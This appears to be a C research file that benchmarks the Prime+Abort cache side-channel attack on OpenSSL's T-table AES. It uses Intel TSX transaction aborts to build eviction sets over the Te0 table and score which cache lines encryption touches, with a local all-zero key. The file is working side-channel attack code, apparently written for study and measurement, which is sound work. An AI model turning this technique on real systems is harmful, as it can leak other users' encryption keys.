/**
 * This file is has been copied from xlate/aes-pa.c and been modified slightly in order to make it easier to benchmark the prime and abort algorithm
 */
#include "aes-pa-helper.h"

void *crypto_find_te0(int fd)
{
	Elf *elf;
	void *base;

	elf_version(EV_CURRENT);

	elf = elf_begin(fd, ELF_C_READ, NULL);

	if (!(base = gelf_find_sym_ptr(elf, "Te0"))) {
		fprintf(stderr, "error: unable to find the 'Te0' symbol in "
			"libcrypto.so.\n\nPlease compile a version of OpenSSL with the "
			"T-table AES implementation enabled.\n");
		return NULL;
	}

	elf_end(elf);

	return base;
}

int cmp_size(const void *lhs, const void *rhs)
{
	return memcmp(lhs, rhs, sizeof(size_t));
}

int prime_and_abort(struct list *working_set, void *line)
{
	struct list *node;
	size_t ncommits = 0;
	size_t naborts = 0;
	unsigned ret;

	while (ncommits < 16 && naborts < 16) {
		list_foreach(working_set, node);
		*(volatile char *)line;

		if ((ret = xbegin()) == XBEGIN_INIT) {
			list_foreach(working_set, node);
			*(volatile char *)line;
			xend();

			++ncommits;
		} else if (ret & XABORT_CAPACITY) {
			++naborts;
		}
	}

	return ncommits == 0;
}

unsigned char key_data[32] = { 0 };

unsigned char plain[16];
unsigned char cipher[128];
unsigned char restored[128];

	AES_KEY key;
	struct list *node;
	struct list set;
	struct stat stat;
	struct page_set lines, wset;
	int fd;
	char *base;
	char *te0;
	char *cl;
	uintptr_t colour = 0;
	size_t size;
	size_t round;
	size_t i, j;
	size_t byte;
	size_t nways = 16;
	unsigned ret;

int set_up_pa(char * libcrypto_path)
{
	if ((fd = open(libcrypto_path, O_RDONLY)) < 0) {
		perror("open");
		return -1;
	}

	if (!(te0 = crypto_find_te0(fd)))
		return -1;

	if (fstat(fd, &stat) < 0) {
		fprintf(stderr, "error: unable to get the file size of libcrypto.so\n");
		return -1;
	}

	size = ALIGN_UP((size_t)stat.st_size, 4 * KIB);

	if ((base = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0)) == MAP_FAILED) {
		fprintf(stderr, "error: unable to map libcrypto.so\n");
		return -1;
	}

	build_page_pool(&lines, 4096);
	AES_set_encrypt_key(key_data, 128, &key);

	page_set_init(&wset, 16);
	return 1;
}

void execute_pa(){
	for (cl = base + (size_t)te0, j = 0; j < 16; ++j, cl += 64) {
		if (!colour || colour != ((uintptr_t)cl & ~(4 * KIB - 1))) {
			for (i = 0; i < wset.len; ++i) {
				page_set_push(&lines, wset.data[i]);
			}

			find_wset(&lines, &wset, NULL, cl, nways, prime_and_abort);
			limit_wset(&lines, &wset, nways);

			colour = ((uintptr_t)cl & ~(4 * KIB - 1));
		}

		page_set_link(&wset, &set, (size_t)cl & (4 * KIB - 1));

		struct timespec past, now;
		double diff;

		clock_gettime(CLOCK_MONOTONIC, &past);

		for (byte = 0; byte < 256; byte += 16) {
			plain[0] = byte;
			int64_t score = 0;

			for (round = 0; round < 1000000; ++round) {
				for (i = 1; i < 16; ++i) {
					plain[i] = rand() % 256;
				}

				if ((ret = xbegin()) == XBEGIN_INIT) {
					list_foreach(&set, node);

					AES_encrypt(plain, cipher, &key);
					xend();

					++score;
				}
			}

			printf("%" PRId64 " ", score);
			fflush(stdout);
		}

		clock_gettime(CLOCK_MONOTONIC, &now);

		diff = now.tv_sec + now.tv_nsec * .000000001;
		diff -= past.tv_sec + past.tv_nsec * .000000001;
		fprintf(stderr, "time: %.03lfs\n", diff);

		printf("\n");
	}
}

void clean_up_pa(){
	close(fd);
}
